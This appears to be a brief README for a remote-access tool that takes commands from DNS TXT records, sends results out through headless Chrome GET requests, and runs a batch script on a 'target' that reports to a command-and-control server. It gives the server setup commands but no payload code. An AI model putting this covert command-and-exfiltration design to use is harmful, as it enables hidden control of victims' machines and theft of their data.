# Chrome headless

## Operation

### Commands

Parses commands from TXT records in a dedicated DNS server.

### Exfil

Headless Chrome with GET params.

## Running it

For the CNC server, run:

    pipenv install
    pipenv run python server.py

Each time "rat-dns.bat" runs on the target, it will get the last command
queued up in the server and run it, returning the result to the server.
